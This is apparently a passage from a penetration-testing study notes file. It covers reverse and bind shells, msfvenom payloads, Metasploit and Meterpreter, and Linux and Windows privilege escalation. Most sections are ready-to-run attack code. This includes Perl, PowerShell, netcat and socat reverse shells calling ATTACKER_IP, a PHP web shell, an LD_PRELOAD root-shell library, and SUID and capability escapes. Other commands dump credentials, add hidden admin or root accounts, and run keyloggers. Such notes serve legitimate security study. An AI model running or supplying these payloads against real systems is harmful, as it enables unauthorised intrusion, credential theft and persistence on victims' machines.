perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

### Bind Shell
#bind-shell

Target opens a port and waits for attacker to connect.

**Characteristics:**
- Target machine has listener on a specific port
- Attacker connects to target
- Less common (often blocked by firewalls)
- Opposite of reverse shell

**Target Machine (Listener):**
```bash
nc -lvnp 4444 -e /bin/bash           # Netcat bind shell
```

**Attacker Machine (Connects):**
```bash
nc TARGET_IP 4444                    # Connect to bind shell
```

---

### Shell Stabilization Techniques
#shell-stabilization

Netcat shells are fragile by default:
- Pressing Ctrl+C kills the shell
- Very unstable
- Non-interactive
- Strange formatting errors

**Reason:** Shells initially run as processes inside a terminal rather than as a terminal itself.

#### Technique 1: Python PTY
#python-pty

**Only applicable to Linux targets**

Three-stage process:

**Step 1:** Spawn better shell with Python
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
# or
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Step 2:** Give access to terminal commands
```bash
export TERM=xterm
```

**Step 3:** Background shell and configure terminal
```bash
# Press Ctrl+Z to background
stty raw -echo; fg
# Then press Enter twice
```

**What this does:**
- Removes terminal echo
- Allows tab auto-complete
- Enables arrow keys
- Allows Ctrl+C to kill processes (not the shell itself)
- `fg` foregrounds the shell

**Note:** When shell dies, type `reset` to restore your terminal.

**Optional - Fix Terminal Size:**
```bash
# On your local machine:
stty -a                              # Note rows and columns values

# In reverse shell:
stty rows <NUMBER>
stty cols <NUMBER>
```

---

#### Technique 2: rlwrap
#rlwrap

Gives access to:
- Command history
- Tab auto-complete
- Arrow keys

**Installation:**
```bash
sudo apt install rlwrap              # Kali Linux
```

**Usage:**
```bash
rlwrap nc -lvnp 443                  # Prepend rlwrap to netcat listener
```

**Best for:** Windows shells (where Python technique doesn't work)

---

#### Technique 3: Socat
#socat-stabilization

Use Netcat as stepping stone to Socat.

**Limited to Linux targets** (no difference between NC and Socat on Windows for this purpose)

**Process:**
1. Transfer socat static binary to target machine
2. Use socat for more stable shell

**On Attacker Machine:**
```bash
# Setup web server to serve socat binary
sudo python3 -m http.server 80
```

**On Target (Linux) - Download socat:**
```bash
wget http://ATTACKER_IP/socat -O /tmp/socat
chmod +x /tmp/socat
```

**On Target (Windows) - Download socat:**
```powershell
Invoke-WebRequest -Uri http://ATTACKER_IP/socat.exe -OutFile C:\Windows\Temp\socat.exe
```

**After transfer, use socat for stabilization (see Socat section below).**

---

### Socat Shells
#socat

"Connector between two points" - More stable than Netcat.

**Advantages:**
- More stable shells
- Encrypted shells possible
- Better for TTY shells

**Disadvantages:**
- More complex syntax
- Not installed by default
- Requires static binary transfer for full functionality

#### Basic Socat Shells

**Reverse Shell Listener (Attacker):**
```bash
socat TCP-L:PORT -
# Example
socat TCP-L:443 -
```

**Reverse Shell (Target - Windows):**
```bash
socat TCP:ATTACKER_IP:PORT EXEC:powershell.exe,pipes
```

**Reverse Shell (Target - Linux):**
```bash
socat TCP:ATTACKER_IP:PORT EXEC:"bash -li"
```

**Bind Shell (Target):**
```bash
socat TCP-L:PORT EXEC:"bash -li"
# or Windows
socat TCP-L:PORT EXEC:powershell.exe,pipes
```

**Connect to Bind Shell (Attacker):**
```bash
socat TCP:TARGET_IP:PORT -
```

---

#### Fully Stable Linux TTY Reverse Shell
#socat-tty

**Only for Linux targets**

**Attacker Machine (Listener):**
```bash
socat TCP-L:PORT FILE:`tty`,raw,echo=0
# Example
socat TCP-L:443 FILE:`tty`,raw,echo=0
```

**Target Machine (Connect back):**
```bash
socat TCP:ATTACKER_IP:PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

**Breakdown of flags:**
- `pty` - Pseudo-terminal (makes it seem like normal terminal)
- `stderr` - Show error messages in shell
- `sigint` - Better Ctrl+C handling (kills processes inside shell)
- `setsid` - Creates new session for cleaner interactions
- `sane` - Restores normal terminal behaviors and stabilizes

**Socat Verbosity:**
```bash
socat -d -d TCP-L:PORT FILE:`tty`,raw,echo=0    # Verbose output
```

---

#### Encrypted Socat Shells
#encrypted-shells #openssl

Helps bypass IDS by encrypting shell traffic.

**Step 1: Generate Certificate (on Attacker Machine)**
```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

# Merge key and certificate
cat shell.key shell.crt > shell.pem
```

**Step 2: Setup Encrypted Listener (Attacker)**
```bash
socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0 -
# Example
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
```

**Step 3: Connect with Encrypted Shell (Target)**

**Reverse Shell:**
```bash
socat OPENSSL:ATTACKER_IP:PORT,verify=0 EXEC:/bin/bash
```

**Bind Shell (Target):**
```bash
socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0 EXEC:/bin/bash
```

**Connect to Encrypted Bind Shell (Attacker):**
```bash
socat OPENSSL:TARGET_IP:PORT,verify=0 -
```

**Note:** For Windows bind shells, certificate must be copied to target.

---

### Common Shell Payloads
#shell-payloads

#### Netcat Reverse Shells

**Linux - mkfifo Method:**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT >/tmp/f
```

**Explanation:**
- `mkfifo` - Create named pipe
- Data flows through pipe to shell
- Shell output redirected back through netcat

#### PowerShell Reverse Shell
#powershell-reverse-shell

Modern Windows servers commonly require PowerShell reverse shells.

**One-liner (compressed):**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

### MSFVenom Shell Payloads
#msfvenom #payload-generation

#### Basic Syntax
```bash
msfvenom -p <PAYLOAD> <OPTIONS>
```

#### Common Options
```bash
LHOST=<Listener_IP>                  # Your IP (attacker)
LPORT=<Listener_Port>                # Your port
-f <format>                          # Output format (exe, elf, raw, etc.)
-o <output_file>                     # Output file name
-e <encoder>                         # Encoder to use
-b '\x00\x0a'                        # Bad characters to avoid
--list formats                       # List all formats
--list payloads                      # List all payloads
```

#### Generate Windows Reverse Shell
```bash
# Basic Windows x64 reverse shell
msfvenom -p windows/x64/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe

# Staged payload (smaller initial size)
msfvenom -p windows/x64/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe

# Stageless payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o shell.exe
```

#### Generate Linux Reverse Shell
```bash
# Linux x64 reverse shell (ELF format)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o shell.elf

# Make executable
chmod +x shell.elf
```

#### Generate PHP Reverse Shell
```bash
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=443 -f raw -o shell.php
```

#### Generate Python Reverse Shell
```bash
msfvenom -p python/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f raw -o shell.py
```

#### Meterpreter Payloads
```bash
# Windows Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -o meterpreter.exe

# Linux Meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf -o meterpreter.elf

# PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f raw -o meterpreter.php
```

#### Encoding Payloads
```bash
# Encode with shikata_ga_nai
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f exe -e x86/shikata_ga_nai -i 5 -o encoded.exe

# -e: encoder
# -i: iterations
```

**Note:** Modern obfuscation techniques or learning methods to inject shellcode is better than encoding alone.

---

### Payload Naming Convention
#payload-naming

Format: `<OS>/<architecture>/<payload>`

**Examples:**
- `linux/x86/shell_reverse_tcp` - Stageless reverse shell for x86 Linux
- `windows/x64/shell/reverse_tcp` - Staged reverse shell for x64 Windows
- `windows/shell_reverse_tcp` - Windows 32-bit (no architecture specified)

**Key Difference:**
- `_` (underscore) = **Stageless** payload
- `/` (forward slash) = **Staged** payload

#### Staged vs Stageless

**Staged Payloads:**
- Two stages
- First: Stager (small piece of code)
- Second: Stage (full payload loaded after connection)
- Smaller initial size
- Doesn't touch disk (runs in memory)
- Requires special listener (Metasploit `multi/handler`)

**Stageless Payloads:**
- Single piece of code
- Self-contained
- Larger file size
- Can be caught with netcat or socat
- Easier to use but larger

---

### Web Shells
#web-shells

Scripts that run inside a web server to execute code.

**Common Locations on Kali:**
```bash
/usr/share/webshells/
```

**Types:**
- PHP web shells
- ASP web shells
- JSP web shells

**Simple PHP Web Shell:**
```php
<?php system($_GET['cmd']); ?>
```

**Usage:**
```
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=cat /etc/passwd
```

**Note:** Won't work on Windows servers by default.

**Advanced Web Shells:**
- File upload/download
- Database connection
- Command history
- Multiple command execution

---

### Post-Shell Actions
#post-exploitation #shell-upgrade

#### On Linux Systems

**Look for:**
1. **SSH Keys** in user home directories
```bash
ls -la /home/USER/.ssh
cat /home/USER/.ssh/id_rsa         # Private key
cat /home/USER/.ssh/authorized_keys # Authorized keys
```

2. **Credentials** in:
```bash
/home/USER/.bash_history
/home/USER/.mysql_history
/var/www/html/config.php           # Web app configs
/etc/passwd
/etc/shadow                         # Requires root
```

#### On Windows Systems

**Look for:**
1. **Registry stored passwords**
```cmd
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

2. **FileZilla credentials** (stored in XML, plaintext or MD5)
```cmd
%APPDATA%\FileZilla\recentservers.xml
```

3. **Create admin account** (if you have admin/SYSTEM privileges)
```cmd
net user USERNAME PASSWORD /add
net localgroup administrators USERNAME /add

# RDP, WinRM, PsExec depending on services running
```

4. **Enable RDP**
```cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

**Goal:** Always escalate and normalize shell access (SSH, RDP, WinRM, etc.)

---

## Metasploit

#metasploit #framework #exploitation

**Metasploit Framework** - Comprehensive exploitation framework.

### Launching Metasploit
#msfconsole

```bash
msfconsole                           # Launch Metasploit console
msfconsole -q                        # Quiet mode (no banner)
```

---

### Metasploit Modules
#msf-modules

1. **Exploits** - Code that takes advantage of vulnerabilities
2. **Payloads** - Code that runs after exploitation
3. **Encoders** - Encode exploits to avoid AV detection (indirectly)
4. **Evasion** - Modules that try to directly avoid detection
5. **Post** - Post-exploitation modules (useful for final stage)
6. **Auxiliary** - Scanning, fuzzing, and other support functions
7. **NOPs** - No Operation (do nothing) - used as buffer to achieve consistent payload sizes

---

### Basic Metasploit Commands
#msf-commands

```bash
# Search for modules
search <term>
search type:exploit platform:windows smb
search cve:2021 type:exploit

# Use a module
use <module_path>
use exploit/windows/smb/ms17_010_eternalblue

# Show module options
show options
show payloads
show targets
show advanced

# Set options
set RHOSTS 192.168.1.100
set RHOST 192.168.1.100              # Single target
set LHOST 192.168.1.50               # Your IP
set LPORT 443                        # Your port
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Global settings (across all modules)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Unset options
unset RHOSTS
unsetg LHOST

# Run the exploit
exploit                              # Run exploit
exploit -j                           # Run exploit as job (background)
run                                  # Run auxiliary module

# Check if target is vulnerable (without exploiting)
check

# Background current session
background
# or press Ctrl+Z

# Session management
sessions                             # List active sessions
sessions -i 1                        # Interact with session 1
sessions -k 1                        # Kill session 1
sessions -K                          # Kill all sessions

# Jobs (background tasks)
jobs                                 # List running jobs
jobs -k 1                            # Kill job 1
jobs -K                              # Kill all jobs

# Other commands
back                                 # Leave module context
info                                 # Show module information
search                               # Search for modules
help                                 # Show help menu
exit                                 # Exit Metasploit
```

---

### Metasploit Payloads
#msf-payloads

Six types of payloads:

1. **Singles** - Self-contained payloads (add user, launch notepad.exe, etc.)
2. **Stagers** - Set up connection channel between Metasploit and target
3. **Stages** - Downloaded by stager (allows for larger payloads)
4. **Adapters** - Wrap singles payloads to convert formats (e.g., PowerShell adapter)
5. **Post** - Post-exploitation modules
6. **Evasion** - AV evasion modules

**Notation:**
- `_` (underscore) = **Single** payload
- `/` (forward slash) = **Staged** payload

**Example:**
```
windows/x64/shell_reverse_tcp        # Single (stageless)
windows/x64/shell/reverse_tcp        # Staged
```

---

### Handlers
#msf-handlers

**Handler** = Receiving connection from target (catching a shell)

Required for:
- Reverse shells
- Meterpreter callbacks

#### Setup Handler

```bash
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 443
exploit -j                           # Run as background job
```

---

### Meterpreter
#meterpreter

**Metasploit attack payload** providing an interactive shell.

**Characteristics:**
- Runs entirely in memory (doesn't write to disk)
- Uses in-memory DLL injection
- Avoids AV detection (no files to scan)
- Acts as agent in C2 (Command & Control) architecture
- Uses TLS encrypted communications (avoids detection by NIPS/NIDS)

#### Meterpreter Versions

```bash
# List all Meterpreter payloads
msfvenom --list payloads | grep meterpreter
```

**Decision factors:**
1. Target OS
2. Target system components (Python installed? PHP site? etc.)
3. Network connection type (TCP allowed? HTTPS reverse connection?)

#### Common Meterpreter Commands
#meterpreter-commands

```bash
# System information
sysinfo                              # System information
getuid                               # Get current user ID
getpid                               # Get current process ID
ps                                   # List running processes

# File system
pwd                                  # Print working directory
ls                                   # List directory contents
cd <directory>                       # Change directory
cat <file>                           # Read file
download <file>                      # Download file from target
upload <file>                        # Upload file to target
search -f <filename>                 # Search for file

# Process manipulation
migrate <PID>                        # Migrate to another process
execute -f <file>                    # Execute a file
kill <PID>                           # Kill a process

# Privilege escalation
getsystem                            # Attempt privilege escalation to SYSTEM

# Credentials
hashdump                             # Dump password hashes (requires admin)

# Network
ipconfig                             # Show network interfaces
route                                # View routing table
portfwd add -l 3389 -p 3389 -r target  # Port forwarding

# Shell access
shell                                # Drop to system shell (Ctrl+Z to return)
execute -f cmd.exe -i -H             # Interactive hidden command prompt

# Modules
load kiwi                            # Load mimikatz
load python                          # Load Python interpreter
run <script>                         # Run Meterpreter script

# Session
background                           # Background current session
exit                                 # Exit Meterpreter session

# Misc
screenshot                           # Take screenshot
webcam_snap                          # Take webcam picture
record_mic                           # Record from microphone
keyscan_start                        # Start keylogger
keyscan_dump                         # Dump captured keystrokes
keyscan_stop                         # Stop keylogger
clearev                              # Clear event logs

# Help
help                                 # Show help menu
help <command>                       # Help for specific command
```

#### Important Meterpreter Commands Explained

##### getuid
```bash
getuid                               # Display user Meterpreter is running as
```

##### migrate
```bash
migrate <TARGET_PID>                 # Migrate to another process
```

**Purpose:**
- Interact with other programs (e.g., word processor to capture keystrokes)
- Move from unstable process to stable one
- Increase persistence

**Note:** Migrating from higher to lower privileges means you can't go back to higher privileges.

##### hashdump
```bash
hashdump                             # Dump Windows SAM database
```

**Output format:**
```
username:hash_of_username:hash_of_password
```

**Contains:**
- Windows SAM (Security Account Manager) database
- User passwords stored in NTLM format (New Technology LAN Manager)

**Usage:**
- Not mathematically possible to decrypt NTLM hashes
- Can find cleartext password via **rainbow table attacks**
- Can use for **Pass-the-Hash attacks** to authenticate to other systems

##### search
```bash
search -f flag.txt                   # Search for file
search -f *.conf                     # Search with wildcard
search -d C:\\Users -f passwords.txt # Search in specific directory
```

##### shell
```bash
shell                                # Launch regular command-line shell
# Ctrl+Z to return to Meterpreter
```

##### getsystem
```bash
getsystem                            # Elevate privileges to SYSTEM (NT AUTHORITY\SYSTEM)
```

Attempts multiple techniques to escalate to SYSTEM level.

---

### Post-Exploitation Goals with Meterpreter

1. **Gather further information** about target system
2. **Look for interesting files** (credentials, sensitive data)
3. **Find user credentials**
4. **Discover additional network interfaces** (pivoting opportunities)
5. **Privilege escalation**
6. **Lateral movement**

**Loading Additional Modules:**
```bash
load python                          # Load Python interpreter
load kiwi                            # Load Mimikatz (credential dumping)
```

---

### NMAP in Metasploit
#msf-nmap

```bash
db_nmap -sV -sC 192.168.1.0/24       # Run NMAP and store in database
hosts                                # View discovered hosts
services                             # View discovered services
vulns                                # View discovered vulnerabilities
```

---

## Sniffing Attacks

#sniffing #packet-capture #wireshark

### Overview
Uses network packet capture tools to collect information about target.

**Requirements:**
- Proper permissions
- Network card setup (Ethernet 802.3)
- Can be conducted using Ethernet network card

### Packet Capture Tools
#packet-capture

- **tcpdump** - Command-line packet analyzer
- **Wireshark** - GUI packet analyzer
- **tshark** - Terminal version of Wireshark

**Setup Requirements:**
- Wire-tap
- Switch with port mirroring (SPAN port)

---

## MITM / On-Path Attack

#mitm #man-in-the-middle #on-path-attack

**Simple to carry out if:**
- Communications between parties are not encrypted
- No authentication
- No integrity checking

**Mitigation:**
- **DNS over TLS (DoT)** - Port 853
- Use encryption (HTTPS, SSH, etc.)
- Certificate pinning
- Strong authentication

---

## Privilege Escalation - Linux

#privilege-escalation #privesc #linux

Going from lower-level permissions account to a higher one.

**Involves:**
- Exploitation of a flaw
- Design weakness
- Configuration oversight
- Unauthorized access to restricted resources

**Reality:**
- Rare to gain access and instantly have admin
- Enumeration is vital at all steps (pre and post-exploitation)

---

### Enumeration
#enumeration #linux-enum

#### System Information

##### hostname
```bash
hostname                             # Get hostname
```

Sometimes meaningless, but can give clues about naming conventions.

##### uname
```bash
uname -a                             # Print system information
```

Provides information about kernel (handy for privilege escalation).

##### /proc/version
```bash
cat /proc/version                    # Kernel version and additional info
```

**Provides:**
- Kernel version
- Whether GCC compiler is installed
- Additional system information

##### /etc/issue
```bash
cat /etc/issue                       # System identifier
```

Contains OS information (can be customized/changed).

##### /etc/os-release
```bash
cat /etc/os-release                  # OS information
```

#### Process Information

##### ps
```bash
ps                                   # Show running processes
ps -A                                # View all running processes
ps axjf                              # Process tree
ps aux                               # Show processes for all users
```

**Information shown:**
- **PID** - Process ID
- **TTY** - Terminal type used by user
- **TIME** - Amount of CPU time used
- **CMD** - Executable/command running

#### Environment Variables

##### env
```bash
env                                  # Show environment variables
```

**Check for:**
- PATH variable (compilers, scripting languages like Python)

#### Sudo Permissions

##### sudo -l
```bash
sudo -l                              # List commands current user can run as sudo
```

#### User Information

##### id
```bash
id                                   # Get UID, GID, and groups
id <username>                        # Get info about another user
```

##### /etc/passwd
```bash
cat /etc/passwd                      # Discover users on system
cat /etc/passwd | cut -d ":" -f 1    # List all usernames
cat /etc/passwd | grep home          # Show users with home directories
```

**Format:**
```
username:password:UID:GID:comment:home_directory:shell
```

#### Command History

```bash
history                              # Show command history
cat ~/.bash_history                  # View bash history file
cat ~/.zsh_history                   # View zsh history file
cat ~/.mysql_history                 # MySQL history
```

#### Network Information

##### ifconfig / ip
```bash
ifconfig                             # Show network interfaces
ip addr                              # Show network interfaces (newer)
ip a                                 # Short version
```

##### ip route
```bash
ip route                             # Map network routes
```

Shows how to contact others in the network.

##### netstat
#netstat

```bash
netstat -a                           # Show all listening ports and established connections
netstat -at                          # TCP protocols only
netstat -au                          # UDP protocols only
netstat -l                           # Show listening ports (open and ready)
netstat -lt                          # Show listening TCP ports
netstat -s                           # List network usage statistics by protocol
netstat -st                          # TCP statistics
netstat -su                          # UDP statistics
netstat -ltp                         # Listening ports with service name and PID
netstat -i                           # Interface statistics
netstat -ano                         # All sockets, no name resolution, display timers
```

**Note:** `-p` requires root/correct user privileges.

#### File Searching with find
#find-command

```bash
# Find files by name
find / -name filename 2>/dev/null
find . -name "*.txt"

# Find directories
find / -type d -name dirname

# Find files with specific permissions
find / -type f -perm 0777 2>/dev/null    # 777 permissions (rwxrwxrwx)
find / -perm a=x 2>/dev/null             # Executable for all

# Find files by user
find / -user username 2>/dev/null

# Find files modified/accessed recently
find / -mtime -7                          # Modified in last 7 days
find / -atime -7                          # Accessed in last 7 days
find / -cmin -60                          # Changed in last 60 minutes
find / -amin -60                          # Accessed in last 60 minutes

# Find files by size
find / -size 50M                          # Exactly 50 MB
find / -size +100M                        # Greater than 100 MB
find / -size -10M                         # Less than 10 MB

# Find world-writable folders
find / -writable -type d 2>/dev/null
find / -perm -22 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

# Find world-executable folders
find / -perm -o x -type d 2>/dev/null

# Find development tools
find / -name python* 2>/dev/null
find / -name gcc* 2>/dev/null
find / -name perl* 2>/dev/null

# Find SUID files
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null

# Suppress errors
find / -name filename 2>/dev/null         # Redirects errors to /dev/null
```

**SUID Bit:**
- Allows file to run with privilege level of account that owns it
- Can lead to privilege escalation
- Look for unusual SUID binaries

---

### Privilege Escalation Techniques - Linux

#### 1. Kernel Exploits
#kernel-exploits

**Process:**
1. Identify kernel version
2. Search for specific exploit code for that kernel version
3. Run exploit

**Warning:**
- Failed kernel exploits can lead to system crashes
- Ensure this is accounted for in scope beforehand

**Check kernel version:**
```bash
uname -a
uname -r
cat /proc/version
```

**Search for exploits:**
```bash
searchsploit "Linux Kernel 4.4.0"
```

---

#### 2. Sudo Exploits
#sudo-exploits

##### LD_PRELOAD Exploit
#ld-preload

**LD_PRELOAD** is a function that allows any program to use shared libraries.

**If `env_keep` option enabled:**
- Can generate shared library
- Library loaded and executed before program runs

**Limitation:**
- LD_PRELOAD is ignored if real UID is different from effective UID

**Privilege Escalation Path:**

**Step 1:** Check for LD_PRELOAD
```bash
sudo -l
```

Look for: `env_keep+=LD_PRELOAD`

**Step 2:** Create malicious shared library

**Example C code (shell.c):**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

**Step 3:** Compile as shared object
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
```

**Step 4:** Run program with LD_PRELOAD
```bash
sudo LD_PRELOAD=/tmp/shell.so <program_with_sudo>
```

---

#### 3. SUID Exploits
#suid #suid-exploits

**SUID (Set User ID)** allows files to be executed with permissions of file owner.

**Find SUID files:**
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null
```

**Look for:**
- Unusual binaries with SUID bit set
- Known vulnerable SUID binaries

**Example with `nano` having SUID:**
- Can read/write/create files with file owner permissions
- Can edit `/etc/passwd` or `/etc/shadow` for privilege escalation

**GTFOBins:**
- Resource for SUID binary exploits: https://gtfobins.github.io/

**Example exploits:**
```bash
# If bash has SUID
/bin/bash -p

# If vim has SUID
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# If find has SUID
find . -exec /bin/sh -p \; -quit

# If nmap has SUID (older versions)
nmap --interactive
!sh
```

---

#### 4. Capabilities
#capabilities #linux-capabilities

**Capabilities** can increase privilege level of a process.

**Manage privileges at granular level** instead of all-or-nothing root access.

**List capabilities:**
```bash
getcap -r / 2>/dev/null
```

**Example output:**
```
/usr/bin/python3.8 = cap_setuid+ep
```

**Exploit example (if Python has cap_setuid):**
```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Common dangerous capabilities:**
- `cap_setuid` - Can set UID (become root)
- `cap_dac_override` - Bypass file read/write/execute permission checks
- `cap_dac_read_search` - Bypass file read permission checks

---

#### 5. Cron Jobs
#cron-jobs

Cron jobs are scheduled tasks.

**Default:** Run with owner privileges, not current user.

**If:**
- Scheduled task runs with root privileges
- We can change the script
- Then we can run our own script with admin privileges

**Cron job configs stored in:**
```bash
cat /etc/crontab                     # System-wide cron jobs
crontab -l                           # Current user's cron jobs
ls -la /etc/cron.*                   # Cron directories
```

**Crontab format:**
```
# m h dom mon dow user command
* * * * * root /path/to/script.sh
```

**Privilege Escalation:**
1. Find cron job running as root
2. Identify script location
3. Check if you have write permissions
4. Replace script with malicious payload

**Example malicious script:**
```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```

Make it executable:
```bash
chmod +x /path/to/script.sh
```

---

#### 6. PATH Variable Exploitation
#path-exploit

**PATH** is an environment variable that tells OS where to search for executables.

**If writable folder is in PATH:**
- Can create malicious executable
- System will execute it instead of intended binary

**Find writable folders:**
```bash
find / -writable 2>/dev/null | grep -v proc
```

**Exploit:**
1. Find writable folder in PATH
```bash
echo $PATH
```

2. Create malicious executable in that folder
```bash
cd /tmp
echo "/bin/bash" > ls
chmod 777 ls
```

3. Add folder to beginning of PATH
```bash
export PATH=/tmp:$PATH
```

4. When script runs `ls` (without full path), it executes our malicious version

**Alternative:**
If you find a script running as root that calls a program without full path:
```bash
# Script contains:
ls /home/user

# Create malicious version:
cd /tmp
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
```

---

#### 7. NFS (Network File System) Exploits
#nfs #no-root-squash

**NFS config location:**
```bash
cat /etc/exports
```

**Look for:** `no_root_squash`

**By default:**
- NFS changes root user to `nfsnobody`
- Strips files from operating with root privileges

**With `no_root_squash`:**
- Root user on client = root user on server
- Can create executable with SUID bit set

**On attacker machine:**
1. Mount the NFS share
```bash
showmount -e TARGET_IP               # Show available shares
mkdir /tmp/mount
mount -o rw TARGET_IP:/share /tmp/mount
```

2. Create SUID binary
```bash
cd /tmp/mount
# Copy bash or create malicious executable
cp /bin/bash .
chmod +s bash                        # Set SUID bit
chmod +x bash
```

3. On target machine (as low-privilege user)
```bash
cd /share
./bash -p                            # -p preserves SUID
```

---

#### 8. Password Cracking
#password-cracking #john-the-ripper

##### /etc/shadow
```bash
cat /etc/shadow                      # Contains password hashes
```

**Requires root access** to read.

##### John the Ripper

**Unshadow tool:** Combines `/etc/passwd` and `/etc/shadow`
```bash
unshadow /etc/passwd /etc/shadow > passwords.txt
john passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

##### Add new root user

**Create password hash:**
```bash
openssl passwd -1 -salt newsalt newpassword
```

**Add to /etc/passwd:**
```bash
echo 'newuser:$1$newsalt$hash_here:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Switch to new user:**
```bash
su newuser
```

---

## Privilege Escalation - Windows

#privilege-escalation #privesc #windows

### Windows Fundamentals

#### File Systems
#windows-filesystems

**Modern Windows uses NTFS** (New Technology File System)

**Before NTFS:**
- FAT16/32 (File Allocation Table)
- HPFS (High Performance File System)

**FAT partitions** exist mainly on:
- USB drives
- MicroSD cards
- External storage

**NTFS is journaling file system:**
- In case of failure, file system can automatically repair using log file
- Not possible with FAT

**NTFS features:**
- Files larger than 4GB
- Set specific permissions on files/folders
- File/folder compression
- EFS (Encryption File System)

#### Alternate Data Streams (ADS)
#ads #alternate-data-streams

**ADS** is a file attribute specific to Windows NTFS.

**Characteristics:**
- Every file has at least one data stream (`$DATA`)
- ADS allows files to contain more than one data stream
- Not natively displayed in File Explorer
- Requires 3rd party tools or PowerShell to view

**Uses:**
- Malware writers use ADS to hide data
- Can be used as identifier (e.g., file downloaded from internet)

**View ADS:**
```powershell
Get-Item file.txt -Stream *
dir /r                               # CMD
```

#### Windows Folders
#windows-folders

**C:\Windows folder:**
- Contains Windows OS
- Doesn't need to be in C: drive

**Environment Variables:**
```cmd
%windir%                             # Windows directory
%systemroot%                         # System root (usually C:\Windows)
%programfiles%                       # Program Files directory
%temp%                               # Temp directory
```

**System32 folder:**
- `C:\Windows\System32`
- Contains important files critical for OS
- DLL files
- System executables

#### User Profiles
#user-profiles

**Location:** `C:\Users\`

Each user has:
- Desktop
- Documents
- Downloads
- AppData (hidden)

#### Windows System Tools

##### System Configuration (msconfig)
```cmd
msconfig                             # System configuration utility
```

For advanced troubleshooting.

##### System Information (msinfo32)
```cmd
msinfo32                             # System information
```

Detailed hardware and software information.

##### Resource Monitor (resmon)
```cmd
resmon                               # Resource monitor
```

Real-time system resource usage.

#### Windows Command Line Tips

```cmd
command /?                           # Get help
cls                                  # Clear screen
net user                             # List all users
net user username                    # Get user info
net localgroup                       # List local groups
net localgroup administrators        # List administrators
```

---

### Windows Registry
#windows-registry

**Central hierarchical database** used to store information necessary to configure system for:
- Users
- Applications
- Hardware devices

**Registry contains info that Windows continually references:**
- User profiles
- Installed applications
- Document types each app can create
- Property sheet settings for folders/application icons
- Hardware on system
- Ports being used

**Registry Keys:**
- `HKEY_CURRENT_USER` (HKCU)
- `HKEY_LOCAL_MACHINE` (HKLM)
- `HKEY_CLASSES_ROOT` (HKCR)
- `HKEY_USERS` (HKU)
- `HKEY_CURRENT_CONFIG` (HKCC)

---

### Volume Shadow Copy Service (VSS)
#vss #volume-shadow-copy

